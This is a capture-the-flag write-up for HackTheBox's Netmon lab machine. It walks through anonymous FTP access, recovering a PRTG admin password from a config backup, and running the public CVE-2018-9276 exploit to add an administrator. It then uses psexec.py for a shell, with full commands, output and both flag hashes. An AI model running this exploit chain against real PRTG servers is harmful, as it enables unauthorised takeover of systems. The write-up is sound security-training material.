---
title: "HackTheBox | Netmon - Writeup"
excerpt: Writeup for Netmon from HackTheBox
date: 2019-07-01 00:00:00
categories: [cybersec, infosec, hackthebox]
tags: [authenticated rce, ftp, network monitor, PRTG, rce]
---

## Information
Netmon is a Windows box that is on HackTheBox. This machine has several ways to achieve the given secondary task; from 
a reverse shell to a Powershell RCE within PRTG Network Monitor.

## Tasks
- Find the user password
- Find the root password
 
## Summary
- Use `nmap` to see the services
- Use `ncftp` to navigate through its `FTP`
- Login to the PRTG Network Manager panel to use `CVE-2018-9276` to create a new administrator in the system
- Login to the system with the new credentials via `psexec.py`
 
## Walkthrough
### nmap
First, we begin with a standard `nmap` scan.

```
$ nmap -sC -sV 10.10.10.152
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

The scan tells us that there is `HTTP` on Port 80 with PRTG Network Monitor installed on it and `FTP` on Port 21 
which we can login to it anonymously.

### User Flag
Let's take a look at the `FTP` by logging in anonymously.

```
$ ncftp 10.10.10.152

ncftp / > ls -la
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows

ncftp / > cd Users/

ncftp /Users > ls -la
02-25-19  11:44PM       <DIR>          Administrator
02-03-19  12:35AM       <DIR>          Public

ncftp /Users > cd Public/

ncftp /Users/Public > ls -la
02-03-19  08:05AM       <DIR>          Documents
07-16-16  09:18AM       <DIR>          Downloads
07-16-16  09:18AM       <DIR>          Music
07-16-16  09:18AM       <DIR>          Pictures
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       <DIR>          Videos

ncftp /Users/Public > cat user.txt
dd58ce67b49e15105e88096c8d9255a5
```

Thus we've captured the user flag with relative ease.

### Root Flag
#### Logging in to PRTG Network Monitor
Taking a look at the `HTTP` service, we're greeted with a login page for PRTG Network Monitor.

![PRTG Mainscreen][PRTG Mainscreen]

Trying to login in using `prtgadmin`/`prtgadmin` was no use. As a result, snooping around the FTP in hopes of finding 
some files regarding the login credentials was fruitful as there were 3 configuration files in 
`C:\ProgramData\Paessler\"PRTG Network Monitor"`.

```
ncftp / > cd ProgramData

ncftp /ProgramData > ls -la
02-03-19  12:15AM       <DIR>          Licenses
11-20-16  10:36PM       <DIR>          Microsoft
02-03-19  12:18AM       <DIR>          Paessler
02-03-19  08:05AM       <DIR>          regid.1991-06.com.microsoft
07-16-16  09:18AM       <DIR>          SoftwareDistribution
02-03-19  12:15AM       <DIR>          TEMP
11-20-16  10:19PM       <DIR>          USOPrivate
11-20-16  10:19PM       <DIR>          USOShared
02-25-19  10:56PM       <DIR>          VMware

ncftp /ProgramData > cd Paessler/
                     
ncftp /ProgramData/Paessler > ls -la
06-29-19  10:51PM       <DIR>          PRTG Network Monitor

ncftp /ProgramData/Paessler > cd "PRTG Network Monitor"/

ncftp ...r/PRTG Network Monitor > ls -la
02-03-19  12:40AM       <DIR>          Configuration Auto-Backups
06-29-19  10:50PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
06-29-19  10:50PM       <DIR>          Logs (Web Server)
02-25-19  08:01PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-29-19  10:51PM              1647604 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
```

Taking a look at `PRTG Configuration.dat` didn't reveal as much as expected since it had the password encrypted/hashed. 

```html
<login>
    prtgadmin
</login>
<name>
    PRTG System Administrator
</name>
<ownerid>
    100
</ownerid>
<password>
    <flags>
        <encrypted/>
    </flags>
    <cell col="0" crypt="PRTG">
        QUXIQTZPLNTH2YRINUMTSKN4E52LXFJBTODTUERMSE======
    </cell>
    <cell col="1" crypt="PRTG">
        HO3UEODGJD7D6YD264SXU3WZTVNR5UFT
    </cell>
</password>
```

`PRTG Configuration.old` was similar to `PRTG Configuration.dat`, but `PRTG Configuration.old.bak` wasn't like the rest.
The data on it was readable, most notably `<dbpassword>` segment which had a username and a password; `PrTg@dmin2018`.

```html
<dbpassword>
    <!-- User: prtgadmin -->
    PrTg@dmin2018
</dbpassword>
```

Trying to login using this password doesn't work. Since it's a year old backup, changing `PrTg@dmin2018`'s 8 to a 9 
and then trying again works, granting us access to the PRTG Network Manager panel.

![PRTG Panel][PRTG Panel]

#### Exploiting PRTG
At the very bottom of the PRTG Network Manager panel there is a version number; `18.1.37.13946`. Taking that to account, 
running `searchsploit PRTG` reveals several exploits; most notably an authenticated remote code execution; or better 
known as `CVE-2018-9276`.

```
$ searchsploit PRTG
-------------------------------------------------------------------------------
Exploit Title
-------------------------------------------------------------------------------
PRTG Network Monitor < 18.2.38 - (Authenticated) Remote Code Execution
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting
-------------------------------------------------------------------------------
```

Taking a look at [Exploit-DB][Exploit-DB] tells us how to use the exploit.

```
EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
```

Since we logged in to PRTG Network Manager, we can use the developer console to see what cookies we have; which is 
`OCTOPUS`, and use that to use the exploit.

```
$ wget https://www.exploit-db.com/download/46527

$ sed -i -e 's/\r$//' 46527

$ ./46527 -u http://10.10.10.152 -c "OCTOPUS1813713946=ezk4RkMxM0M4LTkxMzYtNEVDOS1CODgwLTc4OUY5QjJERjJFN30%3D; _gat=1"
[*] file created
[*] sending notification wait....

[*] adding a new user 'pentest' with password 'P3nT3st'
[*] sending notification wait....

[*] adding a user pentest to the administrators group
[*] sending notification wait....

[*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```

This created a new user that had administrative privileges; `pentest` with the password `P3nT3st!`. Using `psexec.py` 
from `impacket` we can get a shell and login as `pentest` to get our root flag.

```
$ /usr/share/doc/python-impacket/examples/psexec.py pentest:'P3nT3st!'@10.10.10.152

C:\Windows\system32> cd C:\Users\Administrator\

C:\Users\Administrator> dir
02/25/2019  11:58 PM    <DIR>          .
02/25/2019  11:58 PM    <DIR>          ..
02/03/2019  08:08 AM    <DIR>          Contacts
02/03/2019  12:35 AM    <DIR>          Desktop
02/03/2019  08:08 AM    <DIR>          Documents
02/03/2019  08:08 AM    <DIR>          Downloads
02/03/2019  08:08 AM    <DIR>          Favorites
02/03/2019  08:08 AM    <DIR>          Links
02/03/2019  08:08 AM    <DIR>          Music
02/03/2019  08:08 AM    <DIR>          Pictures
02/03/2019  08:08 AM    <DIR>          Saved Games
02/03/2019  08:08 AM    <DIR>          Searches
02/25/2019  11:06 PM    <DIR>          Videos

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
02/03/2019  12:35 AM    <DIR>          .
02/03/2019  12:35 AM    <DIR>          ..
02/03/2019  12:35 AM                33 root.txt

C:\Users\Administrator\Desktop> type root.txt
3018977fb944bf1878f75b879fba67cc
```

Thus, we've captured the root flag.

[PRTG Mainscreen]:  /images/posts/2019-07-01-htb-netmon/PRTG%20Mainscreen.png
[PRTG Panel]:       /images/posts/2019-07-01-htb-netmon/PRTG%20Panel.png
[Exploit-DB]:       https://www.exploit-db.com/exploits/46527